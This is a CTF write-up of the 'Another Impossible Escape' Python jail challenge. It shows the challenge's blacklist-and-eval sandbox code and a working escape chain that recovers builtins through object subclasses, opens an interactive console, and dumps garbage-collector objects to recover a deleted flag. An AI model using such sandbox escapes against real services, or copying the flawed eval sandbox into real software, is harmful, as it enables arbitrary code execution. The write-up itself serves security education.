---
title: Srdnlen CTF 2025 - Another Impossible Escape
date: '2025-01-19'
lastmod: '2025-01-20T22:03:00+02:00'
categories:
- writeup
- srdnlen25
tags:
- misc
- pyjail
authors:
- salvatore.abello
---

# Another Impossible Escape
## Challenge

```py
#!/usr/bin/env python3
import sys
import re

BANNER = r"""
############################################################
#       _                _   _                             #
#      / \   _ __   ___ | |_| |__   ___ _ __               #
#     / _ \ | '_ \ / _ \| __| '_ \ / _ \ '__|              #
#    / ___ \| | | | (_) | |_| | | |  __/ |                 #
#   /_/   \_\_| |_|\___/ \__|_| |_|\___|_|                 #
#      ___                               _ _     _         #
#     |_ _|_ __ ___  _ __   ___  ___ ___(_) |__ | | ___    #
#      | || '_ ` _ \| '_ \ / _ \/ __/ __| | '_ \| |/ _ \   #
#      | || | | | | | |_) | (_) \__ \__ \ | |_) | |  __/   #
#     |___|_| |_| |_| .__/ \___/|___/___/_|_.__/|_|\___|   #
#    _____          |_|                                    #
#   | ____|___  ___ __ _ _ __   ___                        #
#   |  _| / __|/ __/ _` | '_ \ / _ \                       #
#   | |___\__ \ (_| (_| | |_) |  __/   (Author: @uNickz)   #
#   |_____|___/\___\__,_| .__/ \___|                       #
#                       |_|                                #
#                                                          #
############################################################
""" 

FLAG = "srdnlen{fake_flag}"
del FLAG

class IE:
    def __init__(self) -> None:
        print(BANNER)
        print("Welcome to another Impossible Escape!")
        print("This time in a limited edition! More information here:", sys.version)

        self.try_escape()
        return

    def code_sanitizer(self, dirty_code: str) -> str:
        if len(dirty_code) > 60:
            print("Code is too long. Exiting.")
            exit()

        if not dirty_code.isascii():
            print("Alien material detected... Exiting.")
            exit()

        banned_letters = ["m", "w", "f", "q", "y", "h", "p", "v", "z", "r", "x", "k"]
        banned_symbols = [" ", "@", "`", "'", "-", "+", "\\", '"', "*"]
        banned_words = ["input", "self", "os", "try_escape", "eval", "breakpoint", "flag", "system", "sys", "escape_plan", "exec"]

        if any(map(lambda c: c in dirty_code, banned_letters + banned_symbols + banned_words)):
            print("Are you trying to cheat me!? Emergency exit in progress.")
            exit()

        limited_items = {
            ".": 1,
            "=": 1,
            "(": 1,
            "_": 4,
        }

        for item, limit in limited_items.items():
            if dirty_code.count(item) > limit:
                print("You are trying to break the limits. Exiting.")
                exit()

        cool_code = dirty_code.replace("\\t", "\t").replace("\\n", "\n")
        return cool_code

    def escape_plan(self, gadgets: dict = {}) -> None:
        self.code = self.code_sanitizer(input("Submit your BEST Escape Plan: ").lower())
        return eval(self.code, {"__builtins__": {}}, gadgets)

    def try_escape(self) -> None:
        tries = max(1, min(7, int(input("How many tries do you need to escape? "))))

        for _ in range(tries):
            self.escape_plan()

        return

if __name__ == "__main__":
    with open(__file__, "r") as file_read:
        file_data = re.sub(r"srdnlen{.+}", "srdnlen{REDATTO}", file_read.read(), 1)

    with open(__file__, "w") as file_write:
        file_write.write(file_data)

    IE()
```

## Solve

This challenge is a pyjail with the following limitations:
 - We can't use the following characters: 
 ```
 mwfqyhpvzrxk @`\'-+\"*
 ```
 - We can't use the following words:
 `input, self, os, try_escape, eval, breakpoint, flag, system, sys, escape_plan, exec`
 - We can only use ASCII characters
 - Builtins are removed
 - Also, some characters have a limited usage
    - We can only use `)` once
    - We can only use `.` once
    - We can only use `=` once
    - We can only use `_` four times

A few important things:
 - We can execute a maximum of 7 payloads, with a limit of 60 characters each.
 - The variables defined by us will persist between every payload execution.
 - The flag is in a variable called `FLAG`, which is deleted before executing our payloads and the string will be replaced with `srdnlen{REDATTO}`

Since we can't use certain characters, [this script](LINK HERE!!!!!!!!!!!!!!!!!!!) created two years ago by me, could come in handy.

My idea consists in grabbing `eval` and `input` so I can execute arbitrary code. Since there's a character blacklist I had to build the payload while minding the constraints:

```py
(builtins:={}.__class__.__subclasses__()[2].total.__builtins__,lst:=[].__class__(builtins),input:=builtins[lst[28]],eval:=builtins[lst[20]],eval(input(),builtins))
# Inside eval: __import__("code").interact()
```

Now that we have an interactive console, we can restore the flag by dumping all the objects tracked by the python garbage collector:

```py
__import__("gc").get_objects()
```

### Final exploit

```py
[a:={}.__class__]
[b:=a.__subclasses__]
[b:=b()[2].total]
[b:=b.__builtins__]
[a:=[].__class__(b)]
[c:=[b[a[20]],b[a[28]]()]]
__import__("code").interact()
[d:=c[0](c[1],b)]

__import__("gc").get_objects()
```
